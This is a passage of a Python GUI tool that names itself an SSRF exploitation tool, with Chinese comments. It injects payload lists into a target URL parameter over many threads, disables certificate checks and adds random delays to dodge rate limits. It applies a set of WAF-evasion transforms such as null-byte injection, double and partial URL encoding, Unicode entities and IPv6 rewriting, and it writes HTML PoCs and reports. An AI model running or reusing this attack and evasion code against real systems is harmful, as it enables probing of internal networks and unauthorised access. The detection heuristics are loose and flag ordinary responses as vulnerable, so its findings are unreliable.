    def generate_single_vuln_report(self, vuln):
        """生成单个漏洞的详细报告"""
        severity = self.get_vulnerability_severity(vuln)
        severity_class = severity.replace('风险', '').lower()
        
        return f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>SSRF漏洞详细报告 - 漏洞 #{vuln['id']}</title>
    <style>
        body {{ font-family: SimHei, Arial, sans-serif; margin: 20px; line-height: 1.6; color: #333; }}
        .header {{ background-color: #f8f9fa; padding: 20px; border-radius: 5px; margin-bottom: 20px; }}
        .vulnerability {{ border: 1px solid #ddd; border-radius: 5px; padding: 15px; margin: 15px 0; }}
        .severity {{ display: inline-block; padding: 5px 10px; border-radius: 3px; font-size: 0.9em; font-weight: bold; }}
        .high {{ background-color: #f8d7da; color: #721c24; }}
        .medium {{ background-color: #fff3cd; color: #856404; }}
        .low {{ background-color: #d1ecf1; color: #0c5460; }}
        .payload {{ background-color: #f8f9fa; padding: 10px; border-radius: 3px; font-family: monospace; word-break: break-all; overflow-x: auto; }}
        .section {{ margin-bottom: 20px; }}
        h1, h2, h3 {{ color: #2c3e50; }}
        table {{ width: 100%; border-collapse: collapse; margin: 15px 0; }}
        table, th, td {{ border: 1px solid #ddd; }}
        th, td {{ padding: 12px; text-align: left; }}
        th {{ background-color: #f2f2f2; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>SSRF漏洞详细报告</h1>
        <p>报告ID: SSRF-{datetime.now().strftime("%Y%m%d%H%M%S")}</p>
        <p>测试日期: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</p>
        <p>目标系统: {self.target_url.get()}</p>
    </div>
    
    <div class="section">
        <h2>漏洞信息 <span class="severity {severity_class}">{severity}</span></h2>
        
        <div class="vulnerability">
            <h3>漏洞 #{vuln['id']}</h3>
            <p><strong>受影响URL:</strong> {vuln['url'].split('?')[0]}</p>
            <p><strong>测试参数:</strong> {self.get_current_param()}</p>
            <p><strong>触发Payload:</strong></p>
            <div class="payload">{vuln['payload']}</div>
            <p><strong>完整测试URL:</strong></p>
            <div class="payload">{vuln['url']}</div>
            <p><strong>响应状态码:</strong> {vuln['status_code']}</p>
            <p><strong>响应时间:</strong> {vuln['response_time']:.2f}秒</p>
            <p><strong>漏洞类型:</strong> {vuln['type']}</p>
        </div>
    </div>
    
    <div class="section">
        <h2>漏洞描述</h2>
        <p>{vuln['description']}</p>
        <p>SSRF（服务器端请求伪造）漏洞允许攻击者诱导服务器发起恶意请求，可能导致内网信息泄露、服务攻击等安全问题。</p>
    </div>
    
    <div class="section">
        <h2>验证方法</h2>
        <ol>
            <li>访问漏洞URL: {vuln['url']}</li>
            <li>观察服务器响应，确认可以通过参数控制服务器发起的请求</li>
            <li>尝试修改payload中的地址和端口，验证是否可以访问不同的服务</li>
        </ol>
    </div>
    
    <div class="section">
        <h2>风险影响</h2>
        <ul>
            <li>信息泄露：可能导致内网拓扑、服务版本等敏感信息泄露</li>
            <li>内网探测：攻击者可以通过漏洞探测内部网络结构</li>
            <li>服务攻击：可能对内部服务发起攻击，如Redis未授权访问等</li>
            <li>横向移动：可能被用于内网横向渗透测试</li>
        </ul>
    </div>
    
    <div class="section">
        <h2>修复建议</h2>
        <ol>
            <li>实施严格的URL验证机制，只允许访问白名单中的域名和IP</li>
            <li>禁止服务器请求内网地址（如10.0.0.0/8, 192.168.0.0/16, 127.0.0.0/8等）</li>
            <li>限制可使用的协议，禁止危险协议如gopher、dict、ftp等</li>
            <li>对请求的响应内容进行检查，过滤敏感信息</li>
            <li>使用独立的网络环境隔离外部请求，避免直接访问内部服务</li>
            <li>实施请求频率限制，防止滥用</li>
        </ol>
    </div>
</body>
</html>"""
    
    def generate_complete_report(self):
        """生成包含所有漏洞的完整报告"""
        if not self.vulnerabilities:
            messagebox.showwarning("警告", "没有发现漏洞，无法生成报告")
            return
            
        # 获取下载路径
        download_dir = self.download_path.get()
        if not os.path.exists(download_dir):
            messagebox.showwarning("警告", "下载路径不存在，将使用默认路径")
            download_dir = "reports"
            self.ensure_directory(download_dir)
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        file_name = f"ssrf_complete_report_{timestamp}.html"
        file_path = os.path.join(download_dir, file_name)
        
        # 构建报告内容
        report_content = self.generate_full_report_content()
        
        try:
            with open(file_path, "w", encoding="utf-8") as f:
                f.write(report_content)
            
            # 记录到下载历史
            self.add_to_download_history(file_name, "报告", file_path)
            
            self.log(f"完整SRC漏洞报告已下载到: {file_path}", "success")
            
            # 询问是否打开报告文件
            if messagebox.askyesno("报告生成成功", f"完整报告已保存到 {file_path}\n是否立即打开?"):
                webbrowser.open(f"file://{os.path.abspath(file_path)}")
        except Exception as e:
            self.log(f"生成完整报告失败: {str(e)}", "error")
    
    def generate_full_report_content(self):
        """生成包含所有漏洞的完整报告内容"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_content = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>SSRF漏洞完整报告 - {timestamp}</title>
    <style>
        body {{ font-family: SimHei, Arial, sans-serif; margin: 20px; line-height: 1.6; color: #333; }}
        .header {{ background-color: #f8f9fa; padding: 20px; border-radius: 5px; margin-bottom: 20px; }}
        .vulnerability {{ border: 1px solid #ddd; border-radius: 5px; padding: 15px; margin: 15px 0; }}
        .severity {{ display: inline-block; padding: 3px 8px; border-radius: 3px; font-size: 0.8em; font-weight: bold; }}
        .high {{ background-color: #f8d7da; color: #721c24; }}
        .medium {{ background-color: #fff3cd; color: #856404; }}
        .low {{ background-color: #d1ecf1; color: #0c5460; }}
        .payload {{ background-color: #f8f9fa; padding: 10px; border-radius: 3px; font-family: monospace; word-break: break-all; overflow-x: auto; }}
        .section {{ margin-bottom: 20px; }}
        h1, h2, h3 {{ color: #2c3e50; }}
        table {{ width: 100%; border-collapse: collapse; margin: 15px 0; }}
        table, th, td {{ border: 1px solid #ddd; }}
        th, td {{ padding: 12px; text-align: left; }}
        th {{ background-color: #f2f2f2; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>SSRF漏洞完整报告</h1>
        <p>报告ID: SSRF-{timestamp}</p>
        <p>测试日期: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</p>
        <p>目标系统: {self.target_url.get()}</p>
    </div>
    
    <div class="section">
        <h2>摘要</h2>
        <p>本次测试共发现 {len(self.vulnerabilities)} 个潜在的SSRF漏洞。SSRF（服务器端请求伪造）漏洞允许攻击者诱导服务器发起恶意请求，可能导致内网信息泄露、服务攻击等安全问题。</p>
        
        <h3>漏洞统计</h3>
        <table>
            <tr>
                <th>风险等级</th>
                <th>数量</th>
                <th>说明</th>
            </tr>
            <tr>
                <td><span class="severity high">高风险</span></td>
                <td>{sum(1 for v in self.vulnerabilities if self.get_vulnerability_severity(v) == "高风险")}</td>
                <td>可利用危险协议或直接访问敏感服务</td>
            </tr>
            <tr>
                <td><span class="severity medium">中风险</span></td>
                <td>{sum(1 for v in self.vulnerabilities if self.get_vulnerability_severity(v) == "中风险")}</td>
                <td>可访问本地或内网服务</td>
            </tr>
            <tr>
                <td><span class="severity low">低风险</span></td>
                <td>{sum(1 for v in self.vulnerabilities if self.get_vulnerability_severity(v) == "低风险")}</td>
                <td>存在潜在风险但利用难度较高</td>
            </tr>
        </table>
    </div>
    
    <div class="section">
        <h2>漏洞详情 ({len(self.vulnerabilities)})</h2>
"""
        for vuln in self.vulnerabilities:
            # 评估漏洞严重程度
            severity = self.get_vulnerability_severity(vuln)
            severity_class = severity.replace('风险', '').lower()
            
            report_content += f"""
        <div class="vulnerability">
            <h3>漏洞 #{vuln['id']} <span class="severity {severity_class}">{severity}</span></h3>
            <p><strong>受影响URL:</strong> {vuln['url'].split('?')[0]}</p>
            <p><strong>测试参数:</strong> {self.get_current_param()}</p>
            <p><strong>触发Payload:</strong></p>
            <div class="payload">{vuln['payload']}</div>
            <p><strong>完整测试URL:</strong></p>
            <div class="payload">{vuln['url']}</div>
            <p><strong>响应状态码:</strong> {vuln['status_code']}</p>
            <p><strong>响应时间:</strong> {vuln['response_time']:.2f}秒</p>
            <p><strong>漏洞类型:</strong> {vuln['type']}</p>
            <p><strong>漏洞描述:</strong> {vuln['description']}</p>
        </div>
"""
        
        report_content += f"""
    </div>
    
    <div class="section">
        <h2>验证方法</h2>
        <ol>
            <li>访问上述漏洞URL</li>
            <li>观察服务器响应，确认可以通过参数控制服务器发起的请求</li>
            <li>尝试修改payload中的地址和端口，验证是否可以访问不同的服务</li>
        </ol>
    </div>
    
    <div class="section">
        <h2>风险影响</h2>
        <ul>
            <li>信息泄露：可能导致内网拓扑、服务版本等敏感信息泄露</li>
            <li>内网探测：攻击者可以通过漏洞探测内部网络结构</li>
            <li>服务攻击：可能对内部服务发起攻击，如Redis未授权访问等</li>
            <li>横向移动：可能被用于内网横向渗透测试</li>
        </ul>
    </div>
    
    <div class="section">
        <h2>修复建议</h2>
        <ol>
            <li>实施严格的URL验证机制，只允许访问白名单中的域名和IP</li>
            <li>禁止服务器请求内网地址（如10.0.0.0/8, 192.168.0.0/16, 127.0.0.0/8等）</li>
            <li>限制可使用的协议，禁止危险协议如gopher、dict、ftp等</li>
            <li>对请求的响应内容进行检查，过滤敏感信息</li>
            <li>使用独立的网络环境隔离外部请求，避免直接访问内部服务</li>
            <li>实施请求频率限制，防止滥用</li>
        </ol>
    </div>
    
    <div class="section">
        <h2>报告生成信息</h2>
        <p>本报告由SSRF漏洞利用工具自动生成，测试结果仅供参考，建议进行人工验证。</p>
        <p>生成时间: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</p>
    </div>
</body>
</html>"""
        return report_content
    
    def batch_download_pocs(self):
        """批量下载所有POC"""
        if not self.vulnerabilities:
            messagebox.showwarning("警告", "没有发现漏洞，无法生成POC")
            return
            
        # 获取下载路径
        download_dir = self.download_path.get()
        if not os.path.exists(download_dir):
            messagebox.showwarning("警告", "下载路径不存在，将使用默认路径")
            download_dir = os.path.join("pocs", f"batch_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
        else:
            download_dir = os.path.join(download_dir, f"ssrf_pocs_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
            
        self.ensure_directory(download_dir)
        
        # 生成所有POC
        success_count = 0
        for vuln in self.vulnerabilities:
            try:
                file_name = f"ssrf_poc_{vuln['id']}.html"
                file_path = os.path.join(download_dir, file_name)
                
                # 构建POC内容
                poc_content = self.generate_poc_content(vuln)
                
                with open(file_path, "w", encoding="utf-8") as f:
                    f.write(poc_content)
                
                # 记录到下载历史
                self.add_to_download_history(file_name, "POC", file_path)
                success_count += 1
            except Exception as e:
                self.log(f"生成POC #{vuln['id']} 失败: {str(e)}", "error")
        
        self.log(f"批量生成完成，成功生成 {success_count}/{len(self.vulnerabilities)} 个POC", "success")
        
        # 询问是否打开文件夹
        if messagebox.askyesno("批量生成完成", f"已成功生成 {success_count} 个POC到 {download_dir}\n是否打开文件夹?"):
            webbrowser.open(f"file://{os.path.abspath(download_dir)}")
    
    def package_all_downloads(self):
        """打包所有POC和报告为ZIP文件"""
        if not self.vulnerabilities:
            messagebox.showwarning("警告", "没有发现漏洞，无法生成文件")
            return
            
        # 获取下载路径
        download_dir = self.download_path.get()
        if not os.path.exists(download_dir):
            messagebox.showwarning("警告", "下载路径不存在，将使用默认路径")
            download_dir = "."
            
        # 创建临时目录
        temp_dir = f"ssrf_package_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        self.ensure_directory(temp_dir)
        self.ensure_directory(os.path.join(temp_dir, "pocs"))
        self.ensure_directory(os.path.join(temp_dir, "reports"))
        
        # 生成所有POC
        for vuln in self.vulnerabilities:
            try:
                file_name = f"ssrf_poc_{vuln['id']}.html"
                file_path = os.path.join(temp_dir, "pocs", file_name)
                
                with open(file_path, "w", encoding="utf-8") as f:
                    f.write(self.generate_poc_content(vuln))
            except Exception as e:
                self.log(f"生成POC #{vuln['id']} 失败: {str(e)}", "error")
        
        # 生成完整报告
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            file_name = f"ssrf_vulnerability_report_{timestamp}.html"
            file_path = os.path.join(temp_dir, "reports", file_name)
            
            with open(file_path, "w", encoding="utf-8") as f:
                f.write(self.generate_full_report_content())
        except Exception as e:
            self.log(f"生成报告失败: {str(e)}", "error")
        
        # 创建ZIP文件
        zip_file_name = f"ssrf_package_{timestamp}.zip"
        zip_file_path = os.path.join(download_dir, zip_file_name)
        
        try:
            with zipfile.ZipFile(zip_file_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                # 添加POC文件
                for root, dirs, files in os.walk(os.path.join(temp_dir, "pocs")):
                    for file in files:
                        file_path = os.path.join(root, file)
                        arcname = os.path.relpath(file_path, temp_dir)
                        zipf.write(file_path, arcname)
                
                # 添加报告文件
                for root, dirs, files in os.walk(os.path.join(temp_dir, "reports")):
                    for file in files:
                        file_path = os.path.join(root, file)
                        arcname = os.path.relpath(file_path, temp_dir)
                        zipf.write(file_path, arcname)
            
            # 清理临时文件
            shutil.rmtree(temp_dir)
            
            # 记录到下载历史
            self.add_to_download_history(zip_file_name, "打包文件", zip_file_path)
            
            self.log(f"所有文件已打包为ZIP: {zip_file_path}", "success")
            
            # 询问是否打开文件夹
            if messagebox.askyesno("打包完成", f"所有文件已打包为ZIP并保存到 {zip_file_path}\n是否打开文件夹?"):
                webbrowser.open(f"file://{os.path.abspath(download_dir)}")
                
        except Exception as e:
            self.log(f"打包文件失败: {str(e)}", "error")
    
    # WAF绕过技术实现
    def add_random_parameters(self, payload):
        """添加随机参数来混淆WAF"""
        rand_param = f"rand_{random.randint(1000, 9999)}={random.randint(10000, 99999)}"
        if "?" in payload:
            return f"{payload}&{rand_param}"
        elif "://" in payload:
            parsed = urlparse(payload)
            if parsed.path:
                return f"{payload}?{rand_param}"
            else:
                return f"{payload}/{rand_param}"
        return f"{payload}?{rand_param}"
    
    def change_case(self, payload):
        """随机改变payload的大小写"""
        return ''.join([c.upper() if random.choice([True, False]) else c for c in payload])
    
    def add_null_bytes(self, payload):
        """添加空字节和控制字符"""
        null_chars = ["%00", "%0d", "%0a", "%09", "%0b", "%0c"]
        return f"{payload}{random.choice(null_chars)}"
    
    def add_slash_variations(self, payload):
        """添加斜线变体"""
        if "://" in payload:
            parts = payload.split("://", 1)
            return f"{parts[0]}:///{parts[1]}"
        return payload
    
    def encode_payload(self, payload):
        """对payload进行不同级别的URL编码"""
        encoding_type = random.choice([1, 2, 3])  # 1: 普通编码, 2: 双重编码, 3: 部分编码
        encoded = payload
        
        if encoding_type >= 1:
            encoded = urllib.parse.quote(encoded)
        if encoding_type >= 2:
            encoded = urllib.parse.quote(encoded)
        if encoding_type == 3:
            # 部分编码
            encoded = list(encoded)
            for i in range(len(encoded)):
                if random.choice([True, False]) and encoded[i] not in ['%', ':', '/', '.']:
                    encoded[i] = urllib.parse.quote(encoded[i])
            encoded = ''.join(encoded)
            
        return encoded
    
    def add_fake_subdomain(self, payload):
        """添加伪造的子域名"""
        fake_subdomains = ["api", "cdn", "static", "img", "video", "files", "data"]
        if "://" in payload:
            parts = payload.split("://", 1)
            return f"{parts[0]}://{random.choice(fake_subdomains)}.{parts[1]}"
        return f"{random.choice(fake_subdomains)}.{payload}"
    
    def use_ipv6_variants(self, payload):
        """将IPv4转换为IPv6变体"""
        ipv4_pattern = r"\b(?:\d{1,3}\.){3}\d{1,3}\b"
        match = re.search(ipv4_pattern, payload)
        if match:
            ipv4 = match.group(0)
            # 转换为IPv6映射的IPv4地址
            octets = list(map(int, ipv4.split('.')))
            ipv6 = f"[::ffff:{octets[0]}.{octets[1]}.{octets[2]}.{octets[3]}]"
            return payload.replace(ipv4, ipv6)
        return payload
    
    def use_different_protocols(self, payload):
        """尝试不同的协议变体"""
        protocols = ["http", "https", "HTTP", "HTTPS", "hTtP", "hTtPs"]
        if "://" in payload:
            parts = payload.split("://", 1)
            return f"{random.choice(protocols)}://{parts[1]}"
        return payload
    
    def use_unicode_encoding(self, payload):
        """使用Unicode编码绕过"""
        # 随机选择一些字符进行Unicode编码
        encoded = []
        for c in payload:
            if random.choice([True, False]) and c not in ['/', ':', '.', '@']:
                encoded.append(f"&#x{ord(c):x};")
            else:
                encoded.append(c)
        return ''.join(encoded)
    
    def add_comments(self, payload):
        """添加注释混淆WAF规则"""
        comments = ["/*comment*/", "<!--comment-->", "#comment"]
        if "://" in payload:
            parts = payload.split("://", 1)
            return f"{parts[0]}://{random.choice(comments)}{parts[1]}"
        return payload
    
    def bypass_waf_techniques(self, payload):
        """应用WAF绕过技术处理payload"""
        # 获取启用的绕过技术
        enabled_techniques = []
        tech_mapping = {
            "随机参数混淆": self.add_random_parameters,
            "大小写转换": self.change_case,
            "空字节注入": self.add_null_bytes,
            "斜线变体": self.add_slash_variations,
            "URL编码": self.encode_payload,
            "伪造子域名": self.add_fake_subdomain,
            "IPv6转换": self.use_ipv6_variants,
            "协议变体": self.use_different_protocols,
            "Unicode编码": self.use_unicode_encoding,
            "注释混淆": self.add_comments
        }
        
        for tech_name, var in self.waf_checkbuttons.items():
            if var.get():
                enabled_techniques.append(tech_mapping[tech_name])
        
        if not enabled_techniques:
            return payload
        
        # 深度模式下应用更多绕过技术
        num_techniques = random.randint(2, 4) if self.intensive_mode.get() else random.randint(1, min(2, len(enabled_techniques)))
        
        chosen_techniques = random.sample(enabled_techniques, num_techniques)
        
        modified_payload = payload
        for technique in chosen_techniques:
            modified_payload = technique(modified_payload)
            
        return modified_payload
    
    # 测试核心功能
    def create_session(self):
        """创建带有重试机制的会话"""
        session = requests.Session()
        retry = Retry(
            total=3,
            backoff_factor=0.5,
            status_forcelist=[500, 502, 503, 504]
        )
        adapter = HTTPAdapter(max_retries=retry)
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        return session
    
    def worker(self):
        """工作线程，处理队列中的payload测试任务"""
        session = self.create_session()
        
        while not self.stop_testing and not self.queue.empty():
            payload, payload_index, total_payloads = self.queue.get()
            try:
                self.log(f"测试payload {payload_index}/{total_payloads}: {payload}", "info")
                self.test_ssrf_payload(session, payload)
                
                # 随机延迟，避免触发WAF的速率限制
                if self.random_delay.get():
                    time.sleep(random.uniform(0.3, 1.5))
            except Exception as e:
                self.log(f"测试payload时出错: {str(e)}", "error")
            finally:
                self.queue.task_done()
    
    def start_testing(self):
        """开始测试SSRF漏洞"""
        target = self.target_url.get().strip()
        param = self.get_current_param()
        
        # 验证输入
        if not target or not param:
            messagebox.showwarning("警告", "请输入目标URL并选择测试参数")
            return
            
        if self.testing_in_progress:
            messagebox.showinfo("提示", "测试正在进行中")
            return
            
        # 准备测试环境
        self.testing_in_progress = True
        self.stop_testing = False
        self.vulnerabilities = []
        self.result_text.delete(1.0, tk.END)
        
        # 更新按钮状态和状态标签
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        self.status_label.config(text="测试中...", foreground="orange")
        
        # 确保URL格式正确
        if not re.match(r"^https?://", target):
            target = f"http://{target}"
        
        self.log("开始SSRF漏洞测试...", "info")
        self.log(f"目标URL: {target}", "info")
        self.log(f"测试参数: {param}", "info")
        
        # 记录启用的WAF绕过技术
        enabled_techs = [name for name, var in self.waf_checkbuttons.items() if var.get()]
        self.log(f"启用的WAF绕过技术: {', '.join(enabled_techs) or '无'}", "info")
        self.log(f"深度测试模式: {'启用' if self.intensive_mode.get() else '禁用'}", "info")
        
        # 获取payloads
        payloads = [p.strip() for p in self.payload_text.get(1.0, tk.END).splitlines() if p.strip()]
        
        if not payloads:
            self.log("没有可用的payload，测试中止", "error")
            self.cleanup_testing()
            return
            
        total_payloads = len(payloads)
        self.log(f"共加载 {total_payloads} 个payload，开始测试...", "info")
        
        # 填充任务队列
        for i, payload in enumerate(payloads, 1):
            self.queue.put((payload, i, total_payloads))
        
        # 启动工作线程
        try:
            thread_count = int(self.thread_count.get())
            if thread_count < 1 or thread_count > 20:
                raise ValueError("线程数必须在1-20之间")
        except ValueError:
            thread_count = 5
            self.log(f"无效的线程数，使用默认值: {thread_count}", "warning")
        
        self.threads = []
        for _ in range(thread_count):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()
            self.threads.append(t)
        
        # 监控线程完成情况
        def monitor_threads():
            for t in self.threads:
                t.join()
            self.log("所有测试任务已完成！", "info")
            if self.vulnerabilities:
                self.log(f"共发现 {len(self.vulnerabilities)} 个潜在的SSRF漏洞", "success")
                self.update_vulnerability_list()
                # 自动切换到结果标签页
                self.tab_control.select(2)
            else:
                self.log("未发现明显的SSRF漏洞", "info")
            self.cleanup_testing()
        
        threading.Thread(target=monitor_threads, daemon=True).start()
    
    def stop_testing_action(self):
        """停止当前测试"""
        if not self.testing_in_progress:
            return
            
        self.log("正在停止测试...", "warning")
        self.stop_testing = True
        self.status_label.config(text="停止中...", foreground="orange")
    
    def cleanup_testing(self):
        """清理测试环境"""
        self.testing_in_progress = False
        self.stop_testing = False
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)
        self.status_label.config(text="就绪", foreground="green")
    
    def test_ssrf_payload(self, session, payload):
        """测试单个SSRF payload"""
        if self.stop_testing:
            return
            
        try:
            target = self.target_url.get().strip()
            param = self.get_current_param()
            
            if not re.match(r"^https?://", target):
                target = f"http://{target}"
            
            # 应用WAF绕过技术
            bypassed_payload = self.bypass_waf_techniques(payload)
            
            # 构建测试URL
            parsed_url = urlparse(target)
            query_params = {}
            
            if parsed_url.query:
                # 解析现有查询参数
                query_parts = parsed_url.query.split('&')
                for part in query_parts:
                    if '=' in part:
                        k, v = part.split('=', 1)
                        query_params[k] = v
            
            # 设置测试参数
            query_params[param] = bypassed_payload
            
            # 重建URL
            new_query = urlencode(query_params)
            test_url = parsed_url._replace(query=new_query).geturl()
            
            # 设置代理
            proxies = None
            proxy_val = self.proxy.get().strip()
            if proxy_val:
                proxies = {"http": proxy_val, "https": proxy_val}
            
            # 发送请求
            start_time = time.time()
            
            # 设置请求头
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                "Connection": "close"
            }
            
            # 发送请求
            response = session.get(
                test_url,
                headers=headers,
                proxies=proxies,
                timeout=int(self.timeout.get()),
                verify=False,
                allow_redirects=False
            )
            
            response_time = time.time() - start_time
            
            # 分析响应，判断是否存在SSRF漏洞
            is_vulnerable, vuln_type = self.analyze_response(response, payload)
            
            if is_vulnerable:
                vuln_info = {
                    "id": len(self.vulnerabilities) + 1,
                    "url": test_url,
                    "payload": bypassed_payload,
                    "status_code": response.status_code,
                    "response_time": response_time,
                    "type": vuln_type,
                    "description": f"成功利用SSRF漏洞，使用payload: {bypassed_payload}"
                }
                self.vulnerabilities.append(vuln_info)
                self.log(f"发现潜在SSRF漏洞: {test_url} [Payload: {bypassed_payload}]", "success")
            else:
                self.log(f"Payload测试无明显结果: {bypassed_payload} [状态码: {response.status_code}]", "info")
                
        except requests.exceptions.Timeout:
            # 超时可能表示漏洞存在（例如访问内网服务无响应）
            vuln_info = {
                "id": len(self.vulnerabilities) + 1,
                "url": test_url,
                "payload": bypassed_payload,
                "status_code": "超时",
                "response_time": float(self.timeout.get()),
                "type": "可能的SSRF（超时）",
                "description": f"请求超时，可能存在SSRF漏洞，使用payload: {bypassed_payload}"
            }
            self.vulnerabilities.append(vuln_info)
            self.log(f"请求超时，可能存在SSRF漏洞: {test_url} [Payload: {bypassed_payload}]", "success")
        except Exception as e:
            self.log(f"测试payload时出错: {str(e)} [Payload: {payload}]", "error")
    
    def analyze_response(self, response, original_payload):
        """分析响应判断是否存在SSRF漏洞"""
        # 检查状态码（2xx, 3xx, 4xx都可能表示漏洞存在）
        if 200 <= response.status_code < 500:
            # 检查响应内容中是否有内网特征
            internal_patterns = [
                r"localhost", r"127\.0\.0\.1", r"192\.168\.", 
                r"10\.", r"172\.(1[6-9]|2[0-9]|3[0-1])\.",
                r"nginx", r"apache", r"server", r"mysql",
                r"redis", r"mongodb", r"elasticsearch",
                r"root:", r"bin/", r"etc/", r"proc/",
                r"index of", r"directory listing", r"403 forbidden",
                r"401 unauthorized", r"500 internal server error"
            ]
            
            for pattern in internal_patterns:
                if re.search(pattern, response.text, re.IGNORECASE):
                    return True, f"响应包含内网特征: {pattern}"
            
            # 检查响应时间是否异常（可能访问了内网服务）
            if response.elapsed.total_seconds() > 3:
                return True, "响应时间异常，可能访问了内网服务"
                
            # 检查原payload中的关键部分是否在响应中出现
            payload_parts = original_payload.split("//")[-1].split("/")[0].split(":")[0]
            if re.search(re.escape(payload_parts), response.text, re.IGNORECASE):
                return True, "响应包含payload内容"
                
        # 5xx错误也可能表示漏洞存在（服务器尝试访问但失败）
        elif 500 <= response.status_code < 600:
            error_patterns = [
                r"timeout", r"connection refused", r"internal server error", 
                r"could not connect", r"unable to resolve", r"host not found",
                r"no route to host", r"reset by peer"
            ]
            for pattern in error_patterns:
                if re.search(pattern, response.text, re.IGNORECASE):
                    return True, f"服务器错误包含连接异常: {pattern}"
        
        return False, ""

if __name__ == "__main__":
    root = tk.Tk()
    app = SSRFExploitTool(root)
    root.mainloop()
    
